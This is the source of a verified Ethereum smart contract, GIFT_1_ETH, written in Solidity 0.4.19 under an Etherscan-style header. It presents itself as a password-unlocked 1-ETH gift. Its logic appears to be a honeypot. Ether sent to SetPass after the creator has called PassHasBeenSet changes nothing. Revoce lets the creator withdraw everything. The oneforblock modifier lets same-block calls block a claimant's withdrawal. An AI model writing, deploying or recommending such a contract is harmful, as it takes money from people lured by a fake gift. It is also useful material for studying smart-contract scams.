
//Address: 0x6594ac0a2ba54885ff7d314eb27c9694cb25698b
//Contract name: GIFT_1_ETH
//Balance: 0 Ether
//Verification Date: 3/3/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract GIFT_1_ETH
{
    bytes32 public hashPass;
    
    address sender;
	
	bool passHasBeenSet = false;
	
	uint lastBlock;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
        lastBlock = block.number;
    }
    
    function GetGift(bytes pass)
    external
    payable
    oneforblock
    {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function Revoce()
    public
    payable
    oneforblock
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
    
    modifier oneforblock
    {
        require(lastBlock<block.number);
        _;
    }
    
}
